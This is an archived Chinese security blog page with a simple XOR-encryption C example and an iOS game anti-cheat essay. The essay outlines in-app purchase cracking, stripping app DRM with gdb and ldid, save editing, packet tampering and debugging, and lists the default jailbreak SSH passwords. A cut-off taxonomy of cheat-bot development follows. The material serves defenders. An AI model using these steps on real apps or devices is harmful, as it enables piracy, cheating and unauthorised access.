	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6076.htm" tppabs="http://i.renjihe.com/blog/read.php?6076">异或加密原理</a> <span id="starid6076"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 03:47 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6076.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6076#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6076");'>引用(0)</a> , <a href="read.php-6076.htm" tppabs="http://i.renjihe.com/blog/read.php?6076">阅读(0)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6076" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<div class="t_msgfont" style="color: #333333; font-family: Arial; font-size: 14px; word-wrap: break-word; word-break: break-all; visibility: visible !important; zoom: 1 !important">异或的运算方法是一个二进制运算：<br />1^1=0<br />0^0=0<br />1^0=1<br />0^1=1<br /><br />两者相等为0,不等为1.<br /><br />对于一个字符来说,都可以用二进制码来表示.如A:01000001<br />字符的异或就是对每一位进行二进制运算.<br /><br />用于加密算法时,假设你要加密的内容为A,密钥为B,则可以用异或加密:<br />C=A^B<br />在数据中保存C就行了.<br />用的时候:<br />A=B^C<br />即可取得原加密的内容,所以只要知道密钥,就可以完成加密和解密.</div><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">#include &lt;stdio.h&gt;</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">main()</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&#123;</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; char a[]=&quot;MyPassword&quot;; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; /*要加密的密码*/</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; char b[]=&quot;cryptographic&quot;; &nbsp;&nbsp;&nbsp; /*密钥*/</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; int i;</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; /*加密代码*/</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; for(i=0;a[i]!='&#92;0';i++)</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">a[i]=a[i]^b[i];</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; printf(&quot;You Password encrypted: %s&#92;n&quot;,a);</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; /*解密代码*/</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; for(i=0;a[i]!='&#92;0';i++)</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">a[i]=a[i]^b[i];</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp; printf(&quot;You Password: %s&#92;n&quot;,a);</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&nbsp;&nbsp;</span><br /><span style="font-size: 14px; line-height: 20px; font-family: Arial; color: #333333">&#125;</span>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Aug</span>
	<span class="textbox-calendar-day">18</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6075.htm" tppabs="http://i.renjihe.com/blog/read.php?6075">鉴于iOS平台移动游戏安全防作弊小议</a> <span id="starid6075"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 03:47 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6075.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6075#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6075");'>引用(0)</a> , <a href="read.php-6075.htm" tppabs="http://i.renjihe.com/blog/read.php?6075">阅读(0)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6075" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">去年年会上，公司宣讲自己的发展道路，说要抢占&ldquo;四屏&rdquo;，即PC机（个人电脑）、电视机、大屏幕（电影）和智能移动终端（智能手机，iOS平台，Andriod平台），并且特别强调移动平台，原因是拥有上网手机的用户比拥有电脑的人多的多，而且手机上网群体更容易进行支付行为，这一块市场，对儿童类游戏就是蓝海,充满着无线商机。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px" align="center"><img style="padding: 0px; margin: 0px; border: 0px; vertical-align: top" src="read-2.php-6634" tppabs="http://image.uuu9.com/www/youxichanye//UploadFiles//201203/_Z201203091538519621.jpg" border="0" title="点击图片翻页" width="274" height="266" /><br /><a style="padding: 0px; margin: 0px; outline: none; cursor: pointer; color: #333399" href="javascript:if(confirm('http://chanye.uuu9.com/read.php?6633  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://chanye.uuu9.com/read.php?6633'" tppabs="http://chanye.uuu9.com/viewpic.htm?url=http://image.uuu9.com/www/youxichanye//UploadFiles//201203/201203091538519621.jpg" target="_blank">看大图</a></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　于是公司快速成立并扩大无线部，并火速推出多款游戏，摩尔庄园，摩尔卡丁车，摩尔宝宝，淘米妈妈（儿童上网行为管理应用），虽然就个人而言，都带着中国特色，但其中几款的品质的确不错。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　作为一个奋斗在游戏安全第一线的苦逼妹子，我评价游戏是否受欢迎的标准不是下载量，不是在线人数，不是游戏收益，而是游戏是否存在盈利性质的外挂。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　论坛有作弊攻略了，表示游戏已经初步流行；</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　论坛需要支付货币才能看攻略，表示游戏拥有很大的用户群；</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　淘宝上开始贩卖外挂了，表示游戏项目组可以拿到不菲的奖金了（作为支撑部门悲催的我，每次都是十分眼红的瞅着他们领奖）。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　而我们，游戏不受欢迎没有年终奖，游戏受欢迎则会不停的被骚扰。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　悲催的观察数据包，rtx粘贴一段话，xx总监收到小孩投诉，伏魔塔有人秒杀怀疑使用加速外挂。。。就得屁颠屁颠的去调查。其实就公司内部，都有很多人搞不清楚我们到底是干嘛的，连小孩抱怨运营活动很难中奖都转给我们处理，tnnd。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　好了，停止抱怨。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-正文</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　公司iOS游戏上线，主要面临着这些威胁：</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（1）黑卡，比官方卖的便宜非常多倍，淘宝一搜一堆，（普遍，危害大）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（2）IAP破解（IAP是in-applepurpase游戏内购破解），就是使得游戏中的消费操作变得免费，免费玩新关卡，免费获得道具（普遍，危害大）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（3）IPA破解（ipa是游戏安装包的格式），就是破解游戏安装包，不需要收费就可以安装（普遍，危害大）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（4）游戏存档修改，历史悠久的作弊方式，从第一款游戏的诞生，就有人这么干（普遍，危害大）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（5）游戏通信封包劫持篡改（常见，危害大）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（6）游戏进程调试（门槛高，但危害大）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　<strong style="padding: 0px; margin: 0px">　一、黑卡</strong></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　原理：绝大多是是利用被窃信用卡进行充值，中国区所有iOS应用均受害</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　防御：走法务处理流程，到淘宝知识产权平台进行申诉处理，强制下架，效果非常明显</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　<strong style="padding: 0px; margin: 0px">　二、IAP破解</strong></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　原理：使用游戏内购破解工具，修改内购返回的交易状态，以欺骗软件购买成功。以著名内购补丁iapcraker为例，其实该软件的使用说明已经很清楚的告诉了大家是利用懒惰的程序员没有二次验证保留在苹果服务器上的付费收据。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px" align="center"><img style="padding: 0px; margin: 0px; border: 0px; vertical-align: top" src="read-2.php-6632" tppabs="http://image.uuu9.com/www/youxichanye//UploadFiles//201203/_Z201203091542430461.jpg" border="0" title="点击图片翻页" width="550" height="111" /><br /><a style="padding: 0px; margin: 0px; outline: none; cursor: pointer; color: #333399" href="javascript:if(confirm('http://chanye.uuu9.com/read.php?6631  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://chanye.uuu9.com/read.php?6631'" tppabs="http://chanye.uuu9.com/viewpic.htm?url=http://image.uuu9.com/www/youxichanye//UploadFiles//201203/201203091542430461.jpg" target="_blank">看大图</a></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（红线部分的中文意思是：只要游戏服务器不去验证苹果服务器上的付费收据，就能使你不花钱白拿东西）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　其实iOS开发者指导文档中已经很明确的提醒程序猿了，ｌｏｏｋ</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px" align="center"><img style="padding: 0px; margin: 0px; border: 0px; vertical-align: top" src="read-2.php-6630" tppabs="http://image.uuu9.com/www/youxichanye//UploadFiles//201203/_Z201203091539423661.jpg" border="0" title="点击图片翻页" width="550" height="311" /><br /><a style="padding: 0px; margin: 0px; outline: none; cursor: pointer; color: #333399" href="javascript:if(confirm('http://chanye.uuu9.com/read.php?6629  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://chanye.uuu9.com/read.php?6629'" tppabs="http://chanye.uuu9.com/viewpic.htm?url=http://image.uuu9.com/www/youxichanye//UploadFiles//201203/201203091539423661.jpg" target="_blank">看大图</a></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（红线部分的中文意思是：当应用依赖于独立的服务器来提供订阅、可下载内容或服务时，必须额外验证保留在苹果服务器上的付费收据）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　防御：将用户购买的收据上传到server，由其向A<a style="padding: 0px; margin: 0px; text-decoration: none; outline: none; cursor: pointer; color: #333399" href="javascript:if(confirm('http://chanye.uuu9.com/content/images/2016/06/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php?6628  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://chanye.uuu9.com/content/images/2016/06/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php?6628'" tppabs="http://chanye.uuu9.com/biz/Company.htm?param=2496" target="_blank" class="u9kwlk">pps</a>tore做二次确认，如果检验失败，则将该用户（该设备）加入黑名单，今后其所有向服务器的请求都将被拒绝。（苹果都让你验证了，做外挂的都提醒了，那就二次验证吧）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　<strong style="padding: 0px; margin: 0px">　三、IPA破解</strong></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　原理：去除掉DRM数字签名验证机制，取消ipa对apple帐号的绑定，允许没有合法签名的程序在设备上运行。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　（DRM原理：对所保护的内容建立两把密钥，一把公钥，一把私钥，公钥用来加密，私钥用来解密。。对于一个正版APP来说，APP本身含有公钥，私钥是用于购买APP的账号在电脑授权之后得到的证书，只有公钥和私钥相匹配，软件才能正常安装运行）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　去除原理：游戏在正常运行的时候，在内存中是处于一种解密状态，可以利用调试工具gdb把正在内存中运行的软件镜像完全复制下来，保存为文件。另外还要利用软件otool，来查看游戏的一些信息，比如文件头，从何处开始加密，等等。。。。最后把正常的文件头和复制的解密镜像文件进行合并，使之能够正常执行，最后还要用ldid做一下签名就成功了。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　方法：花钱买正版游戏（要有一份能够正常运行的被正式授的游戏在破解的机器上被执行），用破解工具破解，分发给大家（有点雷峰）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　防御：很无助呀！求方法！！！！！！！！！！！！！！</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　<strong style="padding: 0px; margin: 0px">四、游戏存档修改（老少皆宜的作弊方法）</strong></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　原理：逻辑判断完全依赖于客户端的配置文件、数据文件啥的</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　没什么好解释的了，找到安装程序所在文件夹，可着劲的改，直接在iphone／ipad／itouch上改（ifile真好用），传到PC机上用iFunBox改再同步回去。甚至不会改，也不要紧。只要游戏够火，修改补丁包要多少有多少（当然越火，越要钱）安装后傻瓜式一键操作。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px" align="center"><img style="padding: 0px; margin: 0px; border: 0px; vertical-align: top" src="read-1.php-6627" tppabs="http://image.uuu9.com/www/youxichanye//UploadFiles//201203/_Z201203091539197891.jpg" border="0" title="点击图片翻页" width="348" height="522" /><br /><a style="padding: 0px; margin: 0px; outline: none; cursor: pointer; color: #333399" href="javascript:if(confirm('http://chanye.uuu9.com/read.php?6626  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://chanye.uuu9.com/read.php?6626'" tppabs="http://chanye.uuu9.com/viewpic.htm?url=http://image.uuu9.com/www/youxichanye//UploadFiles//201203/201203091539197891.jpg" target="_blank">看大图</a></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px" align="center">　　（水果忍者的修改补丁包）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　防御：两个字&ldquo;加密&rdquo;，当然破解是迟早的问题（安全措施只是提高门槛而已），关键数据拆分后再加密存放就很能提高作弊门槛。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　碎碎念：不是瞎说，真的，很多iOS游戏的存档都是明文的。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　见过不少收费软件，收费的判断就依赖于一个明文配置文件是否有收费这一个字段；</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　见过不少游戏，将用户数据直接用ｐｌｉｓｔ（ｉＯＳ配置文件的格式）格式存储，该格式用ｐｌｉｓｔ编辑器就可以查看；还有的只是将配置文件的后缀名改成ｄａｔ的格式存储（ｄａｔ文件直接打开是乱码），简直太傻了，然道不知道玩家可以改文件后缀名吗？改为ｐｌｉｓｔ不就又明文了吗？？？</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　<strong style="padding: 0px; margin: 0px">　五、游戏通信包劫持篡改</strong></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　原理：也是老掉牙的网络游戏作弊方法。PC游戏一般都是在本机上修改数据包，而移动设备屏幕太小，操作不方便。于是得想办法使得数据包经过PC机，在PC机上修改。改道的方法也很多啦，使用代理上网，共享PC网络，远程登录。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　防御：还是两个字&ldquo;加密&rdquo;。无论是哪个平台的游戏，客户端游戏，ｆｌａｓｈ游戏，手机游戏，其实只要是联网的。安全两核心之一就是应用层协议安全（另一个是业务逻辑安全）．</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　协议安全依赖于协议的加密算法，协议结构的混淆（登录包可以做比较复杂的混淆而不太影响性能）。不少公司主要是预防</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　１.游戏协议被破解，制作成脱机挂（完全脱离游戏客户端程序，可以与游戏服务器自由通讯的外挂程序）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　２.篡改游戏封包中的重要数值来欺骗服务端（例如篡改封包中对应的游戏货币数值）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　３.嗅探和协议破解工具获得封包中的重要数值</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　一般公司的防御，简单来说就是：</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　1.对提交给服务器的数据做有效性验证（例如没有购买记录却拥有大量游戏内货币）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　２.对整个游戏封包计算CRC校验值并附加到序列号加密算法中，对发送序列号异常封包的操作给以掉线措施。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　<strong style="padding: 0px; margin: 0px">　六、游戏进程调试</strong></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　原理：其实目的也是修改，修改计算逻辑、游戏数据啥的，该方法的难点就是找到游戏修改点。但也有迹可寻。ARMCPU有个特性便是一些加减计算要传送到CPU寄存器(register)进行，因此你会经常看到这些要找的数据会先从内存用LDR指令装载到寄存器,经过一些计算(加或减)后及防溢位判断后便用STR指令存储这寄存器回内存。另外由于这些程式大多是用ObjectiveC或C++语言写成，这些程序员会用一些详细的函数名，例如带有Money,Price,Gold,Exp,Item,Life,Level等。利用这两点便可以将程式锁定在某些函数上，再利用gdb调试工具暂停在某些点一步一步地单步执行及查看一些寄存器，印证是否与你要找的数据是否有关。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　方法：</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　第一步：移动终端安装游戏破解版本（未破解的不能反汇编）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　第二步：在pc机上使远程登录到移动终端（移动终端需要开启SSH服务）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　Windows可以使用PuTTY远程登录；Mac/Linux直接使用sshroot@x.x.x.x</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　(越狱机的默认帐号root:alpine，mobile:alpine为了安全，一定要改掉哦)</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　第三步：采用静态反汇编并配合动态调试并修改源程序。（工具：otool，linker，assembler，gdb）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　第四步：修改源程序后重新签名打包生成完整的安装包（工具：Idid）</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　注：该种方法使用门槛高，一般为专业（或具备破解知识）的外挂制作者使用，生成完整可用的游戏破解包，然后共享或贩卖。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　防御：代码混淆，将源码相关的字符,变量函数,等替换成无意义的字符</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　<strong style="padding: 0px; margin: 0px">　七、其他</strong></p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　还有一些其他的办法在游戏中作弊，调整时钟，常用于判断逻辑依赖于本地时钟的游戏。比如说游戏中，如果苹果的成长需要１个小时，你只需要将时钟拨快一个小时就好。</p><p style="padding: 0px; margin: 0px 0px 20px; font-family: 宋体; font-size: 14px; line-height: 30px">　　总之，各种作弊方法，防不胜防，应对这些，比较滞后但可以亡羊补牢的方法就是对玩家在游戏中的游戏行为，特别是消费收入数值进行监控，以随时发现异常情况。</p>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Aug</span>
	<span class="textbox-calendar-day">17</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6073.htm" tppabs="http://i.renjihe.com/blog/read.php?6073">游戏外挂反外挂杂谈</a> <span id="starid6073"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 20:55 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6073.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6073#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6073");'>引用(0)</a> , <a href="read.php-6073.htm" tppabs="http://i.renjihe.com/blog/read.php?6073">阅读(1)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6073" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">1.游戏外挂分类：<br />⑴按实现方式<br />㈠脱机式:<br />完全脱离游戏客户端程序,可以与游戏服务器自由通讯的外挂程序,开发难度最大, 普通的100多开,对游戏的危害最大 ,严重破坏游戏市场、影响玩家正常游戏、缩短游戏运营周期.<br />正常开发流程:<br />解决反调试保护措施<br />分析游戏启动参数<br />逆向分析出游戏加解密算法<br />逆向分析出地图等资源信息<br />分析登陆封包,实现脱机登陆及获取角色属性、装备、物品、技能相关信息<br />具体功能封包分析<br />整合寻路算法,实现基本挂机<br />根据工作室需求,完善功能</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">㈡内挂式:<br />以游戏客户端程序为载体，依靠客户端程序来完成与游戏服务器的通讯<br />①调用游戏相关功能函数为主<br />正常开发流程:<br />解决反调试保护措施<br />分析游戏启动参数(非必要)<br />分析角色信息&#124;怪物结构&#124;背包结构&#124;技能结构&#124;地面物品等<br />根据游戏通讯函数,逆向回溯出游戏明文发包函数<br />根据明文发包函数调用关系及报文信息分析出选怪、打怪、使用技能、使用物品、走路、买卖、邮寄等函数,实现定点挂机、自动买卖<br />功能完善(支持脚本任务等)</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">②调用游戏明文发包函数为主<br />此内挂开发流程基本与①相同, 只是主要挂机功能函数通过外挂组织明文包直接调用明文发包函数实现。目前此类外挂制作方式越来越流行，原因如下:<br />A. 游戏的中的怪物、技能等数据结构越来越复杂(多级链表方式、多叉树方式等等)、功能函数越来越难回溯(加花、SEH保护、VMP保护等等),逆向分析相对比较困难,而直接从HOOK的明文包分析相关数据及实现相关函数功能反而比较容易;<br />B. 如果游戏交易比较火,再逆向出游戏加解密函数、脱机登陆流程、加入自动寻路算法等等，脱机版本诞生.</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">③按键为主<br />除按键脚本类,其它按键内挂开发流程基本与①相同,只是主要挂机功能函数通过模拟按键方式实现</p><p style="margin: 10px 0px 20px; padding: 0px; color: #333333; font-family: Arial, serif; font-size: 13px; line-height: 21.190000534057617px">⑵按用户类型:<br />㈠普通玩家<br 